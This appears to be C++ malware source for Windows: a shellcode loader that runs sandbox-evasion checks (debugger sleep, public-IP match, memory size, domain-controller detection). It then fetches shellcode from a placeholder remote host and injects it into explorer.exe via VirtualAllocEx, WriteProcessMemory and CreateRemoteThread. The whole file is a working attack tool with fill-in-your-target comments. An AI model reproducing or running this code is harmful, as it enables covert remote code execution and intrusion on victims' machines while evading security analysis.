#include <iostream>
#include <cstdio>
#include <urlmon.h>
#include <windows.h>
#include <NTSecAPI.h>
#include <lm.h>
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib, "Netapi32.lib")

using namespace std;

BOOL Geolocation() {
    char ip_addr[] = "192.168.40.226"; // write your own target ip
    const char* website_url = "https://ifconfig.me/ip";
    IStream* stream;
    string s;
    char buffer[35];
    unsigned long bytesRead;

    if (URLOpenBlockingStreamA(0, website_url, &stream, 0, 0) != S_OK) {
        cerr << "[-] Failed to open URL stream" << endl;
        return FALSE;
    }

    while (true) {
        stream->Read(buffer, sizeof(buffer) - 1, &bytesRead);
        if (bytesRead == 0) {
            break;
        }
        buffer[bytesRead] = '\0';  // null-terminate the buffer
        s.append(buffer);
    }
    stream->Release();

    if (s == ip_addr) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

BOOL Memory() {
    MEMORYSTATUSEX memory;
    memory.dwLength = sizeof(memory);
    if (!GlobalMemoryStatusEx(&memory)) {
        cerr << "[-] Failed to get memory status" << endl;
        return FALSE;
    }
    // Use a more precise method to check memory
    if (memory.ullTotalPhys >= 5LL * 1024 * 1024 * 1024) {  // 5 GB
        return TRUE;
    }
    else {
        return FALSE;
    }
}

BOOL isDomainController() {
    LPCWSTR dcName = NULL;
    NET_API_STATUS status = NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);

    if (status != NERR_Success || dcName == NULL) {
        return FALSE;
    }

    wstring ws(dcName);
    NetApiBufferFree(&dcName);

    if (ws.find(L"\\\\") != wstring::npos) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

int Execution() {
    HANDLE hProcess, hThread;
    DWORD PID = 11192;  // explorer.exe PID
    SIZE_T dwSize = 512;  // shellcode size
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memory_address;
    SIZE_T bytesOut;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
    if (hProcess == NULL) {
        cerr << "[-] Cannot handle the process" << endl;
        return 1;
    }

    const char* url = "https://your-ip.com/index.raw";  // write your ip address and index.raw is your shellcode
    IStream* stream2;
    char buff[512];
    unsigned long bytesRead;
    string str;

    if (URLOpenBlockingStreamA(0, url, &stream2, 0, 0) != S_OK) {
        cerr << "[-] Failed to open URL stream" << endl;
        CloseHandle(hProcess);
        return 1;
    }

    while (true) {
        stream2->Read(buff, sizeof(buff) - 1, &bytesRead);
        if (bytesRead == 0) {
            break;
        }
        buff[bytesRead] = '\0';  // null-terminate the buffer
        str.append(buff);
    }
    stream2->Release();

    memory_address = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);
    if (!memory_address) {
        cerr << "[-] Cannot allocate the memory for shellcode" << endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, memory_address, str.c_str(), dwSize, &bytesOut)) {
        cerr << "[-] Cannot write to process memory" << endl;
        VirtualFreeEx(hProcess, memory_address, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memory_address, 0, 0, 0);
    if (hThread == NULL) {
        cerr << "[-] Cannot create a thread" << endl;
        VirtualFreeEx(hProcess, memory_address, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}

int main(int argc, char* argv[]) {
    if (IsDebuggerPresent() == TRUE) {
        Sleep(60000);
    }
    else {
        cout << "[+] Not a Debugger" << endl;
    }
    if (Geolocation() == TRUE) {
        if (Memory() == TRUE) {
            if (isDomainController() == TRUE) {
                if (Execution() == EXIT_SUCCESS) {
                    Execution();
                    cout << "[+] Payload Executed!" << endl;
                    return EXIT_SUCCESS;
                }
                else {
                    cerr << "[-] Payload Execution Failed" << endl;
                }
            }
            else {
                cerr << "[-] Not a Domain Controller" << endl;
            }
        }
        else {
            cerr << "[-] Insufficient Memory" << endl;
        }
    }
    else {
        cerr << "[-] Geolocation Check Failed" << endl;
    }
    return 1;
}
